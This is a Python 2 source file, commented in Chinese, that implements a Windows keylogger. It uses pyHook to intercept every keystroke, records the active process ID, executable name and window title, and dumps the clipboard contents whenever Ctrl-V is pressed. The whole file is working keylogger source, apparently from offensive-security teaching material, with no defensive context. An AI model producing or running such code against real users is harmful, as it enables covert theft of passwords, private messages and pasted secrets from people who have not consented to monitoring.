# -*- coding: utf-8 -*-

from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
control = None


def get_current_process():
    # 获得前台窗口的句柄(返回目标桌面上当前活动窗口的句柄)
    hwnd = user32.GetForegroundWindow()

    # 获得进程 ID(返回窗口对应的进程 ID)
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # 保存当前的进程 ID
    process_id = "%d" % pid.value

    # 申请内存
    executable = create_string_buffer("\x00" * 512)

    # 打开进程
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    # 利用返回的进程句柄, 获取进程对应的可执行程序的名字
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # 读取窗口标题
    window_title = create_string_buffer("\x00" * 512)

    # 获取窗口标题栏中的文本
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    # 输出进程相关信息
    print
    print
    print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
    print

    # 关闭句柄
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def KeyStroke(event):
    global current_window
    global control

    # 检查目标是否切换了窗口
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # 检测按键是否为非常规按键(除字母数字以外)
    if not (event.KeyID > 32 and event.KeyID < 127):
        # 如果这个键为 [Ctrl], 就做一个记录
        if (event.Key == "Lcontrol") or (event.Key == "Rcontrol"):
            control = True
        print "[%s]" % event.Key,

    # 如果输入为 [Ctrl-V], 则获得剪切板的内容
    # 如果上一个键为 [Ctrl], 且本次输入为 [V]
    elif (event.Key == "V") and control:
        win32clipboard.OpenClipboard()
        pasted_value = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        control = None  # 将记录重置
        print "[PASTE] - %s" % (pasted_value),

    else:
        control = None  # 将记录重置
        print event.Key,

    # 返回直到下一个钩子事件被触发
    return True


# 记录和创建钩子函数管理器
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

# 注册键盘记录的钩子, 然后永久执行
kl.HookKeyboard()
pythoncom.PumpMessages()
